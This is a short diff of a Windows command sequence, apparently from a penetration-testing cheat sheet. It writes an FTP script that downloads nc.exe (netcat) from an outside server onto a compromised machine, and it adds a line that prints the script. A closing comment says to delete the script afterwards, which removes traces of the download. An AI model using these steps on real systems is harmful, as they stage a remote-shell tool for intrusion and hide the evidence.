@@ -4,6 +4,7 @@ echo *PASSWORD*>> ftp.txt
 echo bin>> ftp.txt
 echo GET nc.exe >> ftp.txt
 echo bye >> ftp.txt
+type ftp.txt    *Check that everything is OK*
 ftp -v -n -s:ftp.txt
 
 **Dont forget to rm ftp.txt and exit cmd
